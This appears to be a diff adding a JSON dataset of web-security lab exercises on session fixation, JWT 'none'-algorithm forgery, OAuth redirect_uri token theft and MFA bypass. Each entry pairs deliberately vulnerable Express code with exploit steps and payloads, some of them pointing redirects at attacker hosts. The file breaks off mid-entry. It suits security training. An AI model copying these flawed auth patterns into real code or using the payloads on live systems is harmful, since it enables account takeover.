@@ -1,0 +1,1008 @@
+[{
+  "Lab scenario": "Session fixation via login endpoint parameter manipulation",
+  "Lab Description": "The application's login endpoint allows an attacker to fix a session ID prior to authentication. The application reuses the existing session identifier after login without regenerating it. To solve: hijack Carlos's session using a fixed session ID to access his profile page.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Use Burp Suite to intercept a GET /login request before login. Observe that the session cookie is set before authentication.",
+    "2. With the session ID still valid, forward the login request and note the session cookie is retained after successful login.",
+    "3. Use Burp Repeater to send a GET /login request with a fixed session ID, such as session=fix123.",
+    "4. Send a phishing email to Carlos with a crafted link: https://vuln-site/login?session=fix123. Once Carlos logs in, his session is tied to fix123.",
+    "5. Use Burp with session=fix123 and visit /my-profile. If successful, you access Carlos’s profile and solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'admin123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-profile'); } else { res.send('Invalid'); } }); app.get('/my-profile', (req, res) => { if (req.session.user) res.send('Welcome ' + req.session.user); else res.send('Not authenticated'); }); app.listen(4000);",
+  "payloads": [
+    "GET /login HTTP/1.1\\nCookie: session=fix123",
+    "POST /login HTTP/1.1\\nCookie: session=fix123\\nusername=carlos&password=admin123",
+    "GET /my-profile HTTP/1.1\\nCookie: session=fix123"
+  ]
+},
+{
+  "Lab scenario": "JWT algorithm confusion with 'none' exploit",
+  "Lab Description": "This application's JWT-based authentication accepts user-supplied tokens but does not enforce the algorithm used to verify signatures. The backend accepts the 'none' algorithm without signature verification. To solve: create a forged token to log in as the admin user.",
+  "Difficulty Level": "Easy",
+  "Solution Steps": [
+    "1. Use Burp to capture the Authorization header after logging in with a valid account.",
+    "2. Decode the JWT in jwt.io or Burp Decoder and observe the structure: header, payload, signature.",
+    "3. Modify the header to include \"alg\":\"none\" and change the payload to {\"user\":\"admin\"}.",
+    "4. Remove the signature portion entirely and rebuild the token as header.payload.",
+    "5. Replay the modified Authorization: Bearer token to access /admin. If successful, you access the admin dashboard."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'secretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = JSON.parse(Buffer.from(payload.payload, 'base64').toString()).user; if (user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Not admin'); } try { const verified = jwt.verify(token, secret); if (verified.user === 'admin') return res.send('Admin Access Granted'); else return res.status(403).send('Forbidden'); } catch { return res.status(403).send('Invalid token'); } }); app.listen(4001);",
+  "payloads": [
+    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "GET /admin HTTP/1.1\\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+  ]
+},
+{
+  "Lab scenario": "OAuth misconfiguration allowing unauthorized token usage",
+  "Lab Description": "The application integrates OAuth for SSO but fails to validate the client_id and redirect_uri against a whitelist. This allows a malicious actor to reuse an issued token on a forged client. To solve: obtain a valid token and replay it against a vulnerable resource without authorization.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Use Burp Suite to initiate OAuth login and intercept the authorization flow (GET /oauth/authorize?client_id=trusted-app).",
+    "2. Note the access_token in the final redirect_uri after completing login.",
+    "3. Modify the client_id to a fake app (evil-client) and reuse the access_token from the legitimate flow.",
+    "4. Use Postman to access /account/profile with Authorization: Bearer [reused token] and client_id=evil-client.",
+    "5. Confirm access to restricted profile data tied to another client_id, proving token reusability and misconfigured validation."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'c@rl0s' }]; const validClients = ['trusted-app']; app.get('/oauth/authorize', (req, res) => { const { client_id, username } = req.query; if (!username) return res.send('Login required'); const token = jwt.sign({ user: username }, 'sharedsecret'); res.redirect(`/callback?access_token=${token}`); }); app.get('/account/profile', (req, res) => { const { authorization } = req.headers; const token = authorization.split(' ')[1]; const payload = jwt.verify(token, 'sharedsecret'); if (!payload || !payload.user) return res.status(403).send('Invalid'); res.send('Profile of ' + payload.user); }); app.listen(4002);",
+  "payloads": [
+    "GET /oauth/authorize?client_id=trusted-app&username=carlos",
+    "GET /callback?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "GET /account/profile HTTP/1.1\\nAuthorization: Bearer [copied_token]"
+  ]
+},
+{
+  "Lab scenario": "JWT signature disclosure in Authorization header parsing",
+  "Lab Description": "The application uses JWTs to authorize API requests but misconfigures signature verification. The header parser leaks the JWT secret in debug mode when an invalid token is submitted. The application trusts any token signed with this secret. To solve: exploit the debug leak, forge a token for user 'admin', and access /admin-panel.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Use Postman to send an invalid JWT token to /api/user-info and inspect the verbose debug output.",
+    "Confirm JWT secret leakage in the response body or verbose logs.",
+    "Craft a forged JWT with 'alg: HS256' and 'sub: admin', sign it using the leaked secret using jwt.io.",
+    "Send the forged JWT in the Authorization header to /admin-panel.",
+    "Observe 200 OK and sensitive admin data in the response to verify the exploit."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'insecuredevsecret'; const DEBUG = true; app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.sub }); } catch (err) { if (DEBUG) return res.status(400).json({ error: err.message, debug: 'SECRET: ' + SECRET }); res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.sub === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(3000);",
+  "payloads": [
+    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.XN4iAZF0aDlLuIP6_1dp1zN8vGh44iEtVPGwrfEVmSk"
+  ]
+},
+{
+  "Lab scenario": "OAuth misconfiguration allowing token reuse",
+  "Lab Description": "The application integrates third-party OAuth for login. It reuses old authorization codes and does not bind tokens to sessions. This allows replaying a leaked code to impersonate another user. To solve: extract an intercepted OAuth code from logs, reuse it to generate a valid token for 'victim@example.com', and access their profile.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite to capture a complete OAuth login flow for your own account and analyze the exchange.",
+    "Find an old intercepted code for victim@example.com in the application debug endpoint /oauth/logs.",
+    "Replay the intercepted code against /oauth/token endpoint to obtain an active access token.",
+    "Use this token in the Authorization header to call /api/profile.",
+    "Confirm the profile response shows victim@example.com details."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); let issuedCodes = { 'abc123': 'victim@example.com' }; let accessTokens = {}; app.post('/oauth/token', (req, res) => { const { code } = req.body; if (issuedCodes[code]) { const token = Buffer.from(issuedCodes[code]).toString('base64'); accessTokens[token] = issuedCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/api/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (accessTokens[token]) return res.json({ email: accessTokens[token] }); res.status(403).send('Invalid token'); }); app.get('/oauth/logs', (req, res) => { res.json({ logs: [{ code: 'abc123', email: 'victim@example.com' }] }); }); app.listen(4000);",
+  "payloads": [
+    "POST /oauth/token { \"code\": \"abc123\" }",
+    "GET /api/profile with Authorization: Bearer dmljdGltQGV4YW1wbGUuY29t"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via insecure Set-Cookie path scoping",
+  "Lab Description": "The application sets a session cookie with path=/login only, allowing an attacker to pre-set a session cookie that persists during victim login. This enables session fixation attacks. To solve: set a session cookie with fixed ID, trick victim into login, then hijack session to access /my-account.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use OWASP ZAP to intercept response from /login and confirm the Set-Cookie path=/login attribute.",
+    "Send a crafted request with a fixed session ID to /login and forward it to the victim.",
+    "After the victim logs in, reuse the fixed session ID to access /my-account.",
+    "Observe the victim’s data returned to confirm the session takeover.",
+    "Ensure the session ID is stable and no additional session regeneration occurs."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'victim': 'letmein' }; app.post('/login', (req, res) => { const sessionId = req.cookies['sessid'] || Math.random().toString(36).slice(2); res.setHeader('Set-Cookie', `sessid=${sessionId}; Path=/login`); const { username, password } = req.query; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies['sessid']]; if (user) return res.send('Account data for ' + user); res.send('Unauthorized'); }); app.listen(5000);",
+  "payloads": [
+    "Set Cookie: sessid=fixedsession123",
+    "GET /login?username=victim&password=letmein",
+    "GET /my-account with Cookie: sessid=fixedsession123"
+  ]
+},
+{
+  "Lab scenario": "MFA bypass via logic bug in verification fallback",
+  "Lab Description": "The MFA mechanism includes a logic flaw where failure to submit a token defaults to a verified state if the user is marked 'trusted'. The application misclassifies users as trusted after a single login attempt. To solve: log in, ensure 'trusted' flag is set, then omit the MFA step and access sensitive resources.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Log in with correct credentials to trigger 'trusted' state setting.",
+    "Use Burp to intercept POST /mfa-verify and send request without the token parameter.",
+    "Observe response indicating access granted despite no MFA validation.",
+    "Access /settings page using session cookie to confirm bypass.",
+    "Repeat the flow to ensure consistent bypass across sessions."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(session({ secret: 'devsecret', resave: false, saveUninitialized: true })); const users = { 'alice': { password: 'securepass', trusted: false } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { req.session.user = username; users[username].trusted = true; res.redirect('/mfa-verify'); } else { res.send('Login failed'); } }); app.post('/mfa-verify', (req, res) => { const user = req.session.user; if (users[user].trusted) return res.redirect('/settings'); if (req.body.token === '654321') return res.redirect('/settings'); res.send('MFA failed'); }); app.get('/settings', (req, res) => { if (req.session.user) return res.send('Settings for ' + req.session.user); res.send('Unauthorized'); }); app.listen(6000);",
+  "payloads": [
+    "POST /login username=alice&password=securepass",
+    "POST /mfa-verify with no token parameter",
+    "GET /settings with valid session cookie"
+  ]
+},
+{
+  "Lab scenario": "Session Fixation in OAuth Authorization Flow",
+  "Lab Description": "The lab simulates a third-party login using OAuth. The application does not properly regenerate session identifiers after OAuth authentication. An attacker can fixate a session ID prior to login. To solve: hijack a victim’s session post-OAuth login using a pre-set session token.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Using Burp Suite, navigate to the /auth/initiate endpoint and observe the OAuth redirect to /auth/callback.",
+    "2.Intercept the request to /auth/initiate and extract the session cookie. Share the session token with the victim.",
+    "3.Wait for the victim to complete the OAuth login using the shared session (or simulate it).",
+    "4.After the victim completes login, reuse the fixed session cookie from step 2.",
+    "5.Send a GET /my-account request with the fixed session cookie and verify access to the victim’s account."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const request = require('request'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth/initiate', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.redirect('https://oauth-provider.com/auth?redirect_uri=http://localhost:4000/auth/callback'); }); app.get('/auth/callback', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]) { sessions[sid].authenticated = true; sessions[sid].user = 'victim'; res.redirect('/my-account'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Account page of ' + sessions[sid].user); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
+  "payloads": [
+    "Fix session ID before victim logs in: Cookie: sid=abc123",
+    "Re-use same Cookie: sid=abc123 after victim logs in via OAuth"
+  ]
+},
+{
+  "Lab scenario": "JWT none algorithm authentication bypass",
+  "Lab Description": "This application uses JWT tokens for session handling. However, it accepts tokens signed with the 'none' algorithm without verifying the signature. To solve: forge a JWT with alg=none to impersonate the admin user and access the admin panel.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1.Log in as a regular user and intercept the JWT using Burp Suite.",
+    "2.Decode the JWT using jwt.io or Postman and observe it uses RS256 algorithm.",
+    "3.Craft a new JWT header with \"alg\": \"none\" and payload with \"user\": \"admin\".",
+    "4.Remove the signature part and use this token in the Authorization header.",
+    "5.Send a GET /admin request with the forged token and verify access is granted."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome Admin'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Welcome Admin'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4001);",
+  "payloads": [
+    "Header: {\"alg\":\"none\"}",
+    "Payload: {\"user\":\"admin\"}",
+    "JWT: base64url(header).base64url(payload)."
+  ]
+},
+{
+  "Lab scenario": "Session fixation via login endpoint on SOAP API",
+  "Lab Description": "The backend SOAP service fails to invalidate old session IDs during login. This allows an attacker to fixate a known session and later hijack a victim's authenticated session. To solve: capture a session before login, fixate it, and use it to access the victim’s session.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1.Capture a SOAP login request using Burp Suite. Note the sessionID in the Set-Cookie response.",
+    "2.Share or implant the fixed session cookie into the victim’s browser.",
+    "3.Wait for the victim to log in normally using the fixed session.",
+    "4.Reuse the same session cookie and send a SOAP request to /soap/getProfile.",
+    "5.Verify that the session is now authenticated and data returned belongs to the victim."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { user: 'victim' }; res.cookie('sid', sid); res.send(`<soap:Envelope><soap:Body><loginResponse>OK</loginResponse></soap:Body></soap:Envelope>`); }); app.post('/soap/getProfile', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.user) { res.send(`<soap:Envelope><soap:Body><profile>User: ${sessions[sid].user}</profile></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid session'); } }); app.listen(4002);",
+  "payloads": [
+    "Fix sessionID before victim login: Cookie: sid=xyz999",
+    "Reuse same Cookie: sid=xyz999 to call /soap/getProfile after victim logs in"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via upgrade flow in REST login",
+  "Lab Description": "The application uses session-based authentication and supports an 'upgrade' mechanism where unauthenticated sessions can be promoted after login. The session ID is not regenerated upon successful login, allowing fixation. To solve: Fixate a session ID and login as Carlos without knowing his credentials.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite Proxy to capture the GET /session request and extract the Set-Cookie header (unauthenticated session ID).",
+    "Use OWASP ZAP to confirm that the same session persists across pre-auth and post-auth requests.",
+    "Craft a phishing endpoint that forces Carlos to authenticate while using the fixated session ID in their browser (sent via link or injected in iframe).",
+    "Once Carlos logs in with the fixated session ID, reuse the same ID to access the authenticated session.",
+    "Visit /my-account with the stolen session ID to confirm access to Carlos’s account."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send('Sensitive account data for ' + req.session.username); else res.status(403).send('Not authenticated'); }); app.listen(3000);",
+  "payloads": [
+    "Reuse session ID across victim login and attacker session",
+    "GET /login with fixated JSESSIONID",
+    "Send phishing link with fixated cookie: JSESSIONID=attacker123"
+  ]
+},
+{
+  "Lab scenario": "JWT none algorithm override in GraphQL login API",
+  "Lab Description": "This application uses JWTs to authenticate users for a GraphQL endpoint. The JWT validation accepts tokens with the 'none' algorithm when no signature is provided. To solve: Forge a token with 'none' algorithm and gain access to Carlos’s account.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Use Postman to login with valid credentials and observe the Authorization Bearer token format returned from GraphQL /auth endpoint.",
+    "Decode the JWT using jwt.io and note that it uses RS256 algorithm.",
+    "Manually forge a new JWT token with header { \"alg\": \"none\", \"typ\": \"JWT\" } and payload { \"username\": \"carlos\" }.",
+    "Use the unsigned token in the Authorization header to call a protected GraphQL query (e.g., getAccountData).",
+    "Observe successful access to Carlos's account info in the response."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepassword' }; const pubKey = 'PUBLIC_KEY_PLACEHOLDER'; app.post('/auth', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, pubKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const user = jwt.verify(token, pubKey, { algorithms: ['RS256', 'none'] }); if (user.username) return res.json({ data: 'Welcome back ' + user.username }); } catch { return res.status(403).json({ error: 'Access denied' }); } }); app.listen(4000);",
+  "payloads": [
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
+    "Authorization: Bearer <unsigned-token>",
+    "{ \"query\": \"{ getAccountData }\" }"
+  ]
+},
+{
+  "Lab scenario": "OAuth implicit flow open redirect with token leak",
+  "Lab Description": "This app uses OAuth with the implicit grant type. The redirect_uri parameter is improperly validated, allowing token leakage via open redirect. To solve: Exploit the open redirect to capture an access token and impersonate Carlos.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite to initiate an OAuth login and intercept the /authorize request URL with response_type=token.",
+    "Modify the redirect_uri parameter to redirect to your attacker-controlled server (e.g., https://evil.net/callback).",
+    "Confirm the application accepts unvalidated domains via redirect_uri parameter.",
+    "When Carlos logs in via your malicious link, his token will be sent to your server in the URI fragment.",
+    "Extract the token from the request and use it in a Bearer header to access Carlos’s account."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const users = { carlos: 'carlos-access-token-123' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, username } = req.query; if (response_type === 'token' && users[username]) { const accessToken = users[username]; res.redirect(redirect_uri + '#access_token=' + accessToken); } else { res.status(400).send('Bad request'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(users).includes(token)) res.send('Private profile data for Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
+  "payloads": [
+    "https://victim.com/authorize?response_type=token&client_id=123&redirect_uri=https://evil.net/callback&username=carlos",
+    "Access token from URI fragment: access_token=carlos-access-token-123",
+    "Authorization: Bearer carlos-access-token-123"
+  ]
+},
+{
+  "Lab scenario": "Session replay due to insecure session expiration logic in REST API",
+  "Lab Description": "The application does not enforce session expiration correctly, allowing reuse of stale tokens within a brief timing window. It uses stateless session tokens with no revocation tracking. To solve: replay a previously valid session token to access Carlos's account after logout.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Use Burp Suite to intercept a successful login request and capture the session token in the Set-Cookie header.",
+    "In Postman, validate the session token by using it in a GET /user/me request.",
+    "Logout to invalidate the session, but quickly replay the token using a GET /account request.",
+    "Use OWASP ZAP to fuzz the timing window by delaying requests incrementally and observing 200 OK responses.",
+    "If the token is still accepted briefly after logout, access /account as carlos and confirm session hijack success."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'test123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = Date.now() + '_' + Math.random().toString(36).substring(2); sessions[token] = { username, issued: Date.now() }; res.cookie('token', token); res.send('Logged in'); }); app.post('/logout', (req, res) => { const { token } = req.cookies; delete sessions[token]; res.send('Logged out'); }); app.get('/account', (req, res) => { const session = sessions[req.cookies.token]; if (session && (Date.now() - session.issued < 10000)) { return res.send('Account page for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Replay Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "Replay cookie token from Burp before it expires",
+    "Delay logout by 5 seconds and send /account with same cookie",
+    "GET /account with previous session token from proxy history"
+  ]
+},
+{
+  "Lab scenario": "JWT authentication bypass using 'none' algorithm in GraphQL API",
+  "Lab Description": "The backend incorrectly accepts JWTs signed with the 'none' algorithm. The application uses JWTs to authorize GraphQL queries. To solve: forge a JWT to access Carlos's account profile by injecting a token with 'alg':'none'.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Burp Suite to log in and capture the Authorization: Bearer header from a GraphQL request.",
+    "Decode the JWT using jwt.io and observe that the token is using HS256 and includes 'sub':'wiener'.",
+    "Craft a new JWT manually with 'alg':'none' and 'sub':'carlos', omitting the signature.",
+    "Use Postman to send a GraphQL query with forged JWT to query { me { username email } }.",
+    "If the response includes carlos's email, access /account to complete the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { wiener: 'wienerpass', carlos: 'carlospass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.post('/graphql', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send({ data: { username: 'carlos', email: 'carlos@corp.local' } }); } catch (e) { return res.status(403).send('Invalid token'); } res.send({ data: { username: 'unknown' } }); }); const PORT = 3002; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "JWT with header {\"alg\":\"none\"}, payload {\"sub\":\"carlos\"}, and no signature",
+    "Authorization: Bearer <base64header>.<base64payload>.",
+    "GraphQL query: { me { username email } } with forged JWT"
+  ]
+},
+{
+  "Lab scenario": "OAuth 2.0 code interception due to open redirect in callback endpoint",
+  "Lab Description": "The application integrates with a third-party OAuth provider, but its redirect_uri parameter is vulnerable to open redirection. An attacker can intercept the authorization code and complete OAuth flow as another user. To solve: log in to Carlos's account via stolen OAuth token.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use OWASP ZAP to intercept the OAuth authorization flow and observe the redirect_uri parameter during redirection.",
+    "Modify the redirect_uri to point to attacker.com/callback and send the victim to the modified link.",
+    "On attacker.com, capture the code parameter sent by the OAuth provider.",
+    "Use Postman to exchange the intercepted code for an access token using /oauth/token endpoint.",
+    "Send the token to /me or /account to impersonate Carlos and solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider/token', { code, redirect_uri }); const accessToken = tokenRes.data.access_token; res.send('Authenticated with token: ' + accessToken); }); app.get('/account', async (req, res) => { const { token } = req.query; const userRes = await axios.get('https://oauth-provider/userinfo', { headers: { Authorization: 'Bearer ' + token } }); if (userRes.data.email === 'carlos@corp.local') { return res.send('Account details for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3003; app.listen(PORT, () => console.log(`OAuth Code Interception Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "https://auth.example.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
+    "POST /oauth/token with stolen code and correct client_id/client_secret",
+    "GET /account?token=<stolen-access-token>"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via preserved session ID in OAuth callback",
+  "Lab Description": "The application integrates OAuth for external login but incorrectly preserves session identifiers across the authorization process. The application allows the session ID set before the OAuth login to persist and bind to the authenticated session. To solve: Hijack Carlos's authenticated session by fixing a session ID and triggering OAuth login.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Use Burp Suite to initiate a login via OAuth and intercept the GET /oauth/start request to observe the session cookie.",
+    "2. Manually set a session cookie in your browser before login (e.g., sessionid=attacker123) and complete the OAuth login flow.",
+    "3. Verify that the sessionid remains the same after completing login, confirming session fixation.",
+    "4. Craft a phishing link using the fixed session ID and send it to the victim.",
+    "5. When Carlos completes the OAuth login using your fixed session ID, use the same session ID to access his account page."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = { 'carlos': { loggedIn: false } }; app.get('/oauth/start', (req, res) => { const redirectUri = 'http://localhost:4000/oauth/callback?sid=' + req.session.id; res.redirect(redirectUri); }); app.get('/oauth/callback', (req, res) => { const sid = req.query.sid; if (sid && users['carlos']) { req.session.id = sid; users['carlos'].loggedIn = true; res.send('OAuth login completed'); } else { res.status(403).send('Invalid callback'); } }); app.get('/account', (req, res) => { if (users['carlos'].loggedIn && req.session.id) { res.send('Carlos Account Access'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
+  "payloads": [
+    "http://lab.com/oauth/start (with sessionid=attacker123)",
+    "http://lab.com/oauth/callback?sid=attacker123",
+    "Session fixation attack link to victim"
+  ]
+},
+{
+  "Lab scenario": "JWT algorithm confusion in access token verification",
+  "Lab Description": "The application uses JSON Web Tokens (JWTs) to authorize access to admin functionality but improperly trusts the algorithm field in incoming tokens. The verification step trusts tokens with alg=none or switched signing algorithms. To solve: Forge a valid JWT granting admin access using algorithm confusion.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Use Postman to capture a request with a valid JWT in the Authorization header.",
+    "2. Decode the JWT in jwt.io and observe the alg field and payload content.",
+    "3. Modify the token to use 'alg':'none' and set 'role':'admin' in the payload.",
+    "4. Re-encode the token without a signature and resend it using Burp Repeater.",
+    "5. If the server accepts the unsigned token and grants admin access, verify by accessing the /admin/dashboard endpoint."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('User not admin'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
+  "payloads": [
+    "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
+    "Authorization: Bearer <forged_unsigned_token>",
+    "Modified JWT with role=admin and alg=none"
+  ]
+},
+{
+  "Lab scenario": "Bypassing MFA with misconfigured OTP verification logic",
+  "Lab Description": "The application uses an OTP-based second factor of authentication but verifies only the presence—not validity—of the OTP. A user can bypass this step by submitting a malformed or missing value. To solve: Access Carlos's account page without knowing the valid OTP.",
+  "Difficulty Level": "Easy",
+  "Solution Steps": [
+    "1. Use Burp Suite to intercept the POST /verify-otp request after login.",
+    "2. Observe that the OTP field is submitted as a JSON parameter (e.g., {\"otp\":\"123456\"}).",
